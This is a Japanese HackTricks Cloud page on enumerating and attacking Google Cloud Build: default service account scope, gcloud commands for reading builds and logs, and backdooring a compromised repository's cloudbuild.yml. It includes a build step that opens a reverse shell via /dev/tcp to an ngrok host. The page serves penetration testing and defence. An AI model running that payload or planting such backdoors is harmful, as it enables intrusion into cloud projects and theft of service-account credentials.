# GCP - Cloud Build Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

## 基本情報

Google Cloud Buildは、**ソフトウェアビルド**とリリースプロセスを自動化する管理されたCI/CDプラットフォームであり、**ソースコードリポジトリ**と統合し、幅広いプログラミング言語をサポートしています。開発者がコードを自動的にビルド、テスト、デプロイすることを可能にしながら、ビルドステップとワークフローをカスタマイズする柔軟性を提供します。

各Cloud Buildトリガーは、**Cloudリポジトリに関連しているか、直接外部リポジトリ**（Github、Bitbucket、Gitlab）に接続されています。

Cloud Buildを設定して**ビルド実行に承認を要求する**ことが可能です（デフォルトでは無効）。

**サービスアカウントは`cloud-platform`スコープを持っており**、**すべての権限を使用できます。** **SAが指定されていない場合**（例えばsubmitを行うとき）、**デフォルトのSA** `<proj-number>@cloudbuild.gserviceaccount.com`が**使用されます。**

{% hint style="success" %}
ここやCloudリポジトリからGithub/Bitbucketトークンを盗む方法は見つけられませんでした。なぜならリポジトリがダウンロードされるときには[https://source.cloud.google.com/](https://source.cloud.google.com/)のURLを介してアクセスされ、Githubはクライアントによってアクセスされないからです。
{% endhint %}

### ストレージ

時々、Cloud Buildは**トリガーのファイルを保存するために新しいストレージを生成します**。これは例えば、GCPが提供する例で次のような場合に発生します：
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
### シェルを取得

Storageバケットとして[security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox)が作成され、使用するファイルが含まれた`.tgz`を保存します。
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### 列挙

ビルド設定とログに**機密情報**が見つかる可能性があります。
```bash
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs
```
## 権限昇格

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### 認証されていないアクセス

### cloudbuild.yml

リポジトリの書き込み権限を侵害し、**`cloudbuild.yml`** という名前のファイルが含まれている場合、このファイルに**バックドア**を仕掛けることができます。このファイルは Cloud Build 内で**実行されるコマンドを指定しており**、秘密情報を**漏洩**させたり、行われていることを侵害したり、**Cloud Build サービスアカウント**を侵害することもできます。

{% hint style="info" %}
GCPには、管理者が外部PRからのビルドシステムの実行を制御するオプションがあることに注意してください。"Comment Control"は、コラボレーターやプロジェクトオーナーがPRに対してビルドをトリガーするために**「/gcbrun」とコメントする必要がある**機能です。この機能を使用することで、インターネット上の誰もがビルドシステムをトリガーすることを本質的に防ぐことができます。
{% endhint %}

関連情報については、Github Actionsの攻撃方法に関するページを参照してください（これに似ています）：

{% content-ref url="../../../pentesting-ci-cd/github-security/abusing-github-actions/" %}
[abusing-github-actions](../../../pentesting-ci-cd/github-security/abusing-github-actions/)
{% endcontent-ref %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
